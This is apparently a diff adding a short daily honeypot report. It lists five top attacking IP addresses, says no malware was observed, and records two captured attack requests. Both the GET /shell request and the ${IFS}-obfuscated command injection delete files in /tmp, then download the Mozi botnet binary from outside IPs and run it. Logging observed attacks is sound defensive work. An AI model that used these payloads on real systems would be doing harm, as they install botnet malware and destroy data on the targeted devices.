@@ -1,0 +1,24 @@
+Top 5 IPs for 28-10-2024 :
+
+1.71.2.174
+157.20.146.68
+59.184.249.164
+61.52.212.36
+117.198.12.141
+
+
+Malware Observed:
+
+No Malware observed 
+
+Commands/exploits observed :
+
+GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.115.89.58:42825/Mozi.7;chmod+777+Mozi.7;/tmp/Mozi.7+jaws HTTP/1.1
+User-Agent: Hello, world
+Host: <IP>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+
+
+
+/language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http:/175.107.2.38:48210/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
